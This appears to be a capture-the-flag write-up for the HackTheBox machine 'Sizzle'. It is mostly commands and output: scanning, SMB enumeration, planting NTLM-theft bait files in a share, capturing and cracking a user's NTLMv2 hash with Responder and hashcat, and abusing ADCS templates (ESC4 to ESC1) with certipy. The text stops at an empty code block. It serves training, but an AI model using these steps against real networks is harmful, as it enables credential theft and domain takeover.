# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT sizzle.htb.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 11:06 -0400
Nmap scan report for sizzle.htb.local (10.129.15.12)
Host is up (0.014s latency).
rDNS record for 10.129.15.12: SIZZLE.HTB.LOCAL
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49692/tcp open  unknown
49695/tcp open  unknown
49710/tcp open  unknown
49730/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.79 seconds
```
Something interesting is kerberos is filtered
## Nmap
```python
nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 --min-rate=2000 -sT -A sizzle.htb.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 11:09 -0400
Nmap scan report for sizzle.htb.local (10.129.15.12)
Host is up (0.015s latency).
rDNS record for 10.129.15.12: SIZZLE.HTB.LOCAL

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
443/tcp  open  ssl/https?
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3269/tcp open  ssl/ldap
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/wsmans?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-04-06T15:11:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled but not able to access shares or dump users

## Guest access
### Shares
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --shares
SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.15.12    445    SIZZLE           [*] Enumerated shares
SMB         10.129.15.12    445    SIZZLE           Share           Permissions     Remark
SMB         10.129.15.12    445    SIZZLE           -----           -----------     ------
SMB         10.129.15.12    445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.129.15.12    445    SIZZLE           C$                              Default share
SMB         10.129.15.12    445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.129.15.12    445    SIZZLE           Department Shares READ            
SMB         10.129.15.12    445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.129.15.12    445    SIZZLE           NETLOGON                        Logon server share 
SMB         10.129.15.12    445    SIZZLE           Operations                      
SMB         10.129.15.12    445    SIZZLE           SYSVOL                          Logon server share
```
Read access on `IPC$` and `Department Shares`

```python
smb: \Users\> ls
  .                                   D        0  Tue Jul 10 17:39:32 2018
  ..                                  D        0  Tue Jul 10 17:39:32 2018
  amanda                              D        0  Mon Jul  2 15:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018
  bill                                D        0  Mon Jul  2 15:18:28 2018
  bob                                 D        0  Mon Jul  2 15:18:31 2018
  chris                               D        0  Mon Jul  2 15:19:14 2018
  henry                               D        0  Mon Jul  2 15:18:39 2018
  joe                                 D        0  Mon Jul  2 15:18:34 2018
  jose                                D        0  Mon Jul  2 15:18:53 2018
  lkys37en                            D        0  Tue Jul 10 17:39:04 2018
  morgan                              D        0  Mon Jul  2 15:18:48 2018
  mrb3n                               D        0  Mon Jul  2 15:19:20 2018
  Public                              D        0  Wed Sep 26 01:45:32 2018

		7779839 blocks of size 4096. 3292790 blocks available
smb: \Users\> 
```
Found what look like some users
### Users
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --rid-brute 20000
SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.15.12    445    SIZZLE           498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           500: HTB\Administrator (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           501: HTB\Guest (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           502: HTB\krbtgt (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           503: HTB\DefaultAccount (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.15.12    445    SIZZLE           518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.15.12    445    SIZZLE           571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.15.12    445    SIZZLE           572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.15.12    445    SIZZLE           1001: HTB\SIZZLE$ (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           1102: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.15.12    445    SIZZLE           1103: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.15.12    445    SIZZLE           1104: HTB\amanda (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           1603: HTB\mrlky (SidTypeUser)
SMB         10.129.15.12    445    SIZZLE           1604: HTB\sizzler (SidTypeUser)
```
Dumped all the users

From this i can get a userlist using `cut`

# FTP (21)
Anonymous logon is allowed

It is empty and i cannot write to it

No hidden files either


# Watering hole attack
So after exploring my access on SMB i have write access on some parts of the share

```python
python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
/home/kali/htb/sizzle/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Skipping SCF as it does not work on modern Windows
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Skipping zoom as it does not work on the latest versions
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Skipping Autorun.inf as it does not work on modern Windows
Skipping desktop.ini as it does not work on modern Windows
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
Ill generate some malicious files with my IP in 

```python
sudo responder -I tun0
```
Ill start responder

```python
smb: \users\Public\> prompt off
smb: \users\Public\> mput meeting*
```
This planted all the files in the share

```python
[SMB] NTLMv2-SSP Client   : 10.129.15.12
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:a7a23f40db11ec1f:682568B5D6C8577CA4DFD2A8CDBB82E0:010100000000000000B1E6DCB9C5DC011BF3AB204A2E2AA30000000002000800440041003100310001001E00570049004E002D00560052005A004900590046004B005900450049004C0004003400570049004E002D00560052005A004900590046004B005900450049004C002E0044004100310031002E004C004F00430041004C000300140044004100310031002E004C004F00430041004C000500140044004100310031002E004C004F00430041004C000700080000B1E6DCB9C5DC01060004000200000008003000300000000000000001000000002000002DFC2965814438CFC58DFF413569187977BB688CA98EFFF25B711F29BB381EBE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0039003000000000000000000000000000
```
Ive captured a hash for the user `amanda`

## Cracking the hash
```python
hashcat amanda.hash /usr/share/wordlists/rockyou.txt

AMANDA::HTB:a7a23f40db11ec1f:682568b5d6c8577ca4dfd2a8cdbb82e0:010100000000000000b1e6dcb9c5dc011bf3ab204a2e2aa30000000002000800440041003100310001001e00570049004e002d00560052005a004900590046004b005900450049004c0004003400570049004e002d00560052005a004900590046004b005900450049004c002e0044004100310031002e004c004f00430041004c000300140044004100310031002e004c004f00430041004c000500140044004100310031002e004c004f00430041004c000700080000b1e6dcb9c5dc01060004000200000008003000300000000000000001000000002000002dfc2965814438cfc58dff413569187977bb688ca98efff25b711f29bb381ebe0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0039003000000000000000000000000000:Ashare1972
```
The hash cracked!

```python
amanda:Ashare1972
```
Ill now validate these credentials

```python
nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972'
SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972
```
This user is now compromised

```python
nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972' --shares 
SMB         10.129.15.12    445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.15.12    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972 
SMB         10.129.15.12    445    SIZZLE           [*] Enumerated shares
SMB         10.129.15.12    445    SIZZLE           Share           Permissions     Remark
SMB         10.129.15.12    445    SIZZLE           -----           -----------     ------
SMB         10.129.15.12    445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.129.15.12    445    SIZZLE           C$                              Default share
SMB         10.129.15.12    445    SIZZLE           CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.15.12    445    SIZZLE           Department Shares READ            
SMB         10.129.15.12    445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.129.15.12    445    SIZZLE           NETLOGON        READ            Logon server share 
SMB         10.129.15.12    445    SIZZLE           Operations                      
SMB         10.129.15.12    445    SIZZLE           SYSVOL          READ            Logon server share
```
This user has more access on SMB

Not a lot in those shares 

User cannot login over FTP

After vising the web server and running ferpxbuster i get an endpoint `certenroll` 

So now if i access `/certsrv` i get prompted for a login which amandas creds give me access to

# ADCS
```python
certipy-ad find -u amanda@htb.local -p 'Ashare1972' -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: HTB.LOCAL.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: sizzle.HTB.LOCAL.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'HTB-SIZZLE-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'HTB-SIZZLE-CA'
[*] Checking web enrollment for CA 'HTB-SIZZLE-CA' @ 'sizzle.HTB.LOCAL'
[!] Failed to check channel binding: The read operation timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : HTB-SIZZLE-CA
    DNS Name                            : sizzle.HTB.LOCAL
    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
    Certificate Validity End            : 2028-07-02 20:36:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HTB.LOCAL\Administrators
      Access Rights
        ManageCa                        : HTB.LOCAL\Administrators
                                          HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
        ManageCertificates              : HTB.LOCAL\Administrators
                                          HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
        Enroll                          : HTB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates
  0
    Template Name                       : SSL
    Display Name                        : SSL
    Certificate Authorities             : HTB-SIZZLE-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2018-07-03T18:06:11+00:00
    Template Last Modified              : 2018-07-03T18:06:45+00:00
    Permissions
      Object Control Permissions
        Owner                           : HTB.LOCAL\Administrator
        Full Control Principals         : HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
                                          HTB.LOCAL\Administrator
                                          HTB.LOCAL\Authenticated Users
        Write Owner Principals          : HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
                                          HTB.LOCAL\Administrator
                                          HTB.LOCAL\Authenticated Users
        Write Dacl Principals           : HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
                                          HTB.LOCAL\Administrator
                                          HTB.LOCAL\Authenticated Users
    [+] User Enrollable Principals      : HTB.LOCAL\Authenticated Users
    [+] User ACL Principals             : HTB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```
Looks to be vulnerable to ESC4 which i can use to make it vulnerable to ESC1

## ESC4
```python
certipy-ad template \
    -u 'amanda@htb.local' -p 'Ashare1972' \
    -dc-ip '10.129.15.12' -template 'SSL' \
    -write-default-configuration
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SSL.json'
[*] Wrote current configuration for 'SSL' to 'SSL.json'
[*] Updating certificate template 'SSL'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SSL'? (y/N): y
[*] Successfully updated 'SSL'
```
Using ESC4 i can modify the template to make it vulnerable to ESC1

## ESC1
```python
certipy-ad find -u amanda@htb.local -p 'Ashare1972' -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: HTB.LOCAL.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: sizzle.HTB.LOCAL.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'HTB-SIZZLE-CA' via RRP
[*] Successfully retrieved CA configuration for 'HTB-SIZZLE-CA'
[*] Checking web enrollment for CA 'HTB-SIZZLE-CA' @ 'sizzle.HTB.LOCAL'
[!] Failed to check channel binding: The read operation timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : HTB-SIZZLE-CA
    DNS Name                            : sizzle.HTB.LOCAL
    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
    Certificate Validity End            : 2028-07-02 20:36:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HTB.LOCAL\Administrators
      Access Rights
        ManageCa                        : HTB.LOCAL\Administrators
                                          HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
        ManageCertificates              : HTB.LOCAL\Administrators
                                          HTB.LOCAL\Domain Admins
                                          HTB.LOCAL\Enterprise Admins
        Enroll                          : HTB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates
  0
    Template Name                       : SSL
    Display Name                        : SSL
    Certificate Authorities             : HTB-SIZZLE-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2018-07-03T18:06:11+00:00
    Template Last Modified              : 2026-04-06T16:31:09+00:00
    Permissions
      Object Control Permissions
        Owner                           : HTB.LOCAL\Administrator
        Full Control Principals         : HTB.LOCAL\Authenticated Users
        Write Owner Principals          : HTB.LOCAL\Authenticated Users
        Write Dacl Principals           : HTB.LOCAL\Authenticated Users
    [+] User Enrollable Principals      : HTB.LOCAL\Authenticated Users
    [+] User ACL Principals             : HTB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```
As seen here its now vulnerable to ESC1

```python
certipy-ad account -u 'amanda' -p 'Ashare1972' -dc-ip '10.129.15.12' -user 'sizzler' read      
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'sizzler':
    cn                                  : sizzler
    distinguishedName                   : CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
    name                                : sizzler
    objectSid                           : S-1-5-21-2379389067-1826974543-3574127760-1604
    sAMAccountName                      : sizzler
    userAccountControl                  : 512
    whenCreated                         : 2018-07-12T14:29:49+00:00
    whenChanged                         : 2018-07-12T15:03:19+00:00
```
First ill get the SID of the domain admin which i can tell from bloodhound is `sizzler` and `administrator`

```python

```